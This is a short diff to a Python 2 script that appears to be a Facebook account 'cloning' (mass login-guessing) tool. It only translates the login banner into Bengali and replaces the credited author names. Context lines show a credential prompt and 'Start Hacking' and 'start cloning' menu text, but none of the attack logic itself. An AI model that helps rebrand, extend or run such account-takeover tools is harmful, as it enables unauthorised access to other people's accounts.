@@ -111,7 +111,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;91mAPNA FACEBOOK ACCOUNT LOGIN KREIN \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;91mআপনার ফেসবুক লগইন করুন\x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -194,7 +194,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hacking"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Shahrukh"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Rayhan"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -301,7 +301,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●══════════════════════☠══════════════════════●"
 
-	jalan('            \033[1;91mJam x Mishi start cloning Wait...')
+	jalan('            \033[1;91mRayhan Abir start cloning Wait...')
 	print  "  \033[1;36;48m ●══════════════════════☠══════════════════════●" 
 
 	def main(arg):
